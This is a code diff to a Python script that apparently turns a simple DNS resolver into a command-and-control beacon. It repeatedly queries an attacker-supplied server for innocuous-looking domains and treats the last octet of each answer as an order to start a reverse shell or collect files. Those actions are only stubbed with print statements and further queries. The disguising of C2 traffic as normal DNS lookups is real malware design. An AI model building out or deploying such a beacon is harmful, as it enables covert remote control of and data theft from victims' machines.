@@ -1,7 +1,13 @@
 import socket
 import struct
+import sys
+import time
 
-SERVER = "127.0.0.1" # Placeholder
+if (len(sys.argv) != 2):
+    print("Usage: server.py {ip to send to}")
+    exit
+else:
+    SERVER = sys.argv[1]
 
 def makeQuery(address):
     query = b'\x12\x34'  # Transaction ID
@@ -49,10 +55,43 @@ def formSocket():
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.settimeout(2)
     return sock
-    
+
 sock = formSocket()
-sock.sendto(makeQuery("google.com"), (SERVER, 53))
+sock.sendto(makeQuery("supportcenter.net"), (SERVER, 53))
 resp, _ = sock.recvfrom(512)
 
 ips = getResponse(resp)
 print("Resolved IPs:", ips)
+
+while True:
+    sock.sendto(makeQuery("freegames.net"), (SERVER, 53))
+    resp, _ = sock.recvfrom(512)
+
+    ips = getResponse(resp)
+    print("Resolved IPs:", ips)
+    
+    if(len(ips) == 1):
+        ipSplit = ips[0].split('.')
+        if(ipSplit[3] == "232"):
+            print("Reverse Shell command recieved")
+            sock.sendto(makeQuery("securelogin.com"), (SERVER, 53))
+            resp, _ = sock.recvfrom(512)
+
+            ips = getResponse(resp)
+            print("Resolved IPs:", ips)
+            
+            time.sleep(10)
+        elif(ipSplit[3] == "85"):
+            print("Collecting file contents")
+            
+            sock.sendto(makeQuery("fileshare.org"), (SERVER, 53))
+            resp, _ = sock.recvfrom(512)
+
+            ips = getResponse(resp)
+            print("Resolved IPs:", ips)
+            
+            time.sleep(10)
+        else:
+            time.sleep(10)
+    else:
+        time.sleep(10)
